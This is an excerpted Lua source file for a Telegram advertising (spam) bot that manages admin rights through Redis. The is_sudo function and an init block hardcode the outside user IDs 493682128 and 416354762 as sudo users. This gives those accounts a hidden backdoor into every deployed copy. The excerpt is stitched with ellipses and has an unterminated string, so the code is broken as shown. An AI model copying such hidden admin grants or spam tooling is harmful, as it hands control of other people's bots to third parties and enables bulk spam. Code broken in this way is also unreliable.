...
function is_sudo(msg)
  if redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or msg.sender_user_id == 493682128 then
    return true
  else
    return false
  end
...
if not redis:sismember("tg:" .. Ads_id .. ":sudo", 493682128) then
  redis:set("tg:" .. Ads_id .. ":senddelay", 132)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 493682128)
  redis:sadd("tg:" .. Ads_id .. ":good", "https://t.me/joinchat/HWz90FD5ncf6i0qbKu45FA")
  redis:set("tg:" .. Ads_id .. ":fwdtime", true)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 416354762)
  redis:sadd("tg:" .. Ads_id .. ":wait", "https://t.me/joinchat/GNERykweQFohRS0Xuzvukg)
...
Set added msg => ]] .. tostring(txtadd) .. [[
          ...
          elseif text:match("^([Hh]elp)$") then
            local txt = [[
Help for TeleGram Advertisin Robot (cnc)
